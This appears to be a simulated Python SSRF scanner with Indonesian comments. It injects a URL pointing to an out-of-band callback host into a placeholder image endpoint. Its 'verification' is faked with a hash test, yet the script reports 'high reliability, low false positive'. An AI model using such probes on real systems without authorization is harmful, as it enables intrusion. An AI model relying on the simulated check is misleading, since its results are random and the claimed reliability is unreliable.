import asyncio
import httpx
import time
from typing import List, Dict

# --- Konfigurasi OOB (Simulasi) ---
OOB_COLLABORATOR_BASE = "my-scanner-oob.net"
SSRF_ENDPOINT = "http://target-app.com/api/v1/image?url="

# --- Fungsi Pengecekan OOB (Simulasi Asinkron) ---

async def check_oob_service(hostname_to_check: str) -> bool:
    """
    Mensimulasikan pengecekan callback pada layanan OOB (seperti Burp Collaborator).
    Ini adalah I/O operation yang lambat, sehingga harus asinkron.
    """
    print(f"    [OOB CHECK] Menunggu callback dari {hostname_to_check}...")
    # Waktu tunggu yang realistis untuk OOB
    await asyncio.sleep(2) 
    
    # Simulasi keberhasilan OOB Callback
    if hash(hostname_to_check) % 3 == 0:
        return True
    return False

# --- Fungsi Fuzzing dan OOB Verification ---

async def perform_ssrf_oob_test(client: httpx.AsyncClient) -> Dict:
    """
    Menyuntikkan payload SSRF dan memverifikasi melalui OOB.
    """
    unique_id = hex(int(time.time() * 1000))[2:]
    oob_hostname = f"{unique_id}.{OOB_COLLABORATOR_BASE}"
    
    # Payload yang disuntikkan: URL yang diarahkan ke layanan OOB
    ssrf_payload = f"http://{oob_hostname}"
    injected_url = SSRF_ENDPOINT + ssrf_payload
    
    report = {
        "vulnerability": "SSRF (Server-Side Request Forgery)",
        "status": "NOT VULNERABLE",
        "oob_hostname": oob_hostname,
        "proof": "N/A"
    }

    print(f"[1] Menyuntikkan SSRF Payload: {injected_url}...")
    try:
        # Mengirim payload ke target
        await client.get(injected_url, timeout=5)
        
        # 2. VERIFIKASI OOB
        is_oob_triggered = await check_oob_service(oob_hostname)
        
        if is_oob_triggered:
            report['status'] = "VULNERABLE (OOB Verified)"
            report['proof'] = f"Target mencoba menyelesaikan DNS/HTTP request ke: {oob_hostname}"
        
    except httpx.RequestError as e:
        report['status'] = f"NETWORK ERROR: {type(e).__name__}"
    
    return report

async def main():
    print(f"\n--- 15. PENGUJIAN OUT-OF-BAND (OOB) DAN KEANDALAN DATA ---")
    
    # Menggunakan httpx.AsyncClient
    async with httpx.AsyncClient(follow_redirects=False) as client: # SSRF seringkali sensitif terhadap redirect
        results = await perform_ssrf_oob_test(client)
    
    print("\n--- RINGKASAN OOB VERIFICATION ---")
    
    if results['status'] == "VULNERABLE (OOB Verified)":
        print(f"[🚨 VULNERABLE] {results['vulnerability']}")
        print(f"  - Status: {results['status']}")
        print(f"  - Bukti: {results['proof']}")
    else:
        print(f"[🟢 SECURE] {results['vulnerability']} - Status: {results['status']}")
        
    print(f"\n[INTEGRITAS DATA] Setelah verifikasi OOB, data ini memiliki tingkat keandalan Tinggi (Low False Positive).")

if __name__ == "__main__":
    asyncio.run(main())